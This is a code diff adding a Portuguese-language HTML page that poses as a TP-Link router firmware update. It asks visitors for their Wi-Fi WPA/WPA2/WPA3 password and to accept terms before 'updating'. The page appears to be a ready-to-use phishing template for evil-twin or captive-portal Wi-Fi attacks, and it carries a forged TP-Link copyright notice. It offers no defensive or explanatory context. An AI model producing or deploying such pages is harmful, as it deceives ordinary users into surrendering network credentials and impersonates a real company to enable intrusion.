@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../../assets/css/stylesheet.css">
+    <title>TP-LINK :: Atualização de Firmware</title>
+</head>
+<body>
+    
+    <img src="../../assets/img/new-logo.png" width="150px" class="img-fluid" alt="Responsive image">
+    <section class="container">
+    <div class="form-head">
+        <h1>Atualização de Firmware</h1>
+    </div>
+    <div class="text">
+        <p>Uma nova versão do firmware foi detectada e está aguardando instalação. Por favor, revise nossos novos termos e condições e prossiga.</p>
+    </div>
+    <form id='form1' method="POST">
+        <div class="form-group">
+          <label for="terms">Aceitar termos e condições</label>
+        </div>
+        
+        <div class="form-group">
+            <label for="password">Senha</label>
+            <input type="password" class="form-control" name="password" id="password" placeholder="Senha WPA/WPA2/WPA3" required>
+        </div>
+
+        <div class="form-group form-check">
+            <input type="checkbox" class="form-check-input" id="acceptTerms" required>
+            <label class="form-check-label" for="acceptTerms">Eu aceito os termos e condições</label>
+        </div>
+
+        <div class="form-btn">
+            <button type="submit" class="btn btn-primary">Atualizar</button>
+        </div>
+        <div class="form-check">
+            <small id="copyright" class="form-text text-muted">Copyright © TP-Link Corporation Limited. 2026. Todos os direitos reservados.</small>
+          </div>
+      </form>
+    </section>
+
+    <script src="../../assets/js/jquery-3.5.1.js"></script>
+    <script src="../../assets/js/popper.min.js"></script>
+    <script src="../../assets/js/bootstrap.min.js"></script>
+    <script>
+        document.getElementById('form1').addEventListener('submit', function(event) {
+            var password = document.getElementById('password');
+            var acceptTerms = document.getElementById('acceptTerms');
+
+            if (!acceptTerms.checked) {
+                acceptTerms.setCustomValidity('Você deve aceitar os termos e condições.');
+            } else {
+                acceptTerms.setCustomValidity('');
+            }
+
+            if (password.value === '') {
+                password.setCustomValidity('Você deve digitar uma senha.');
+            } else {
+                password.setCustomValidity('');
+            }
+
+            if (!this.checkValidity()) {
+                event.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
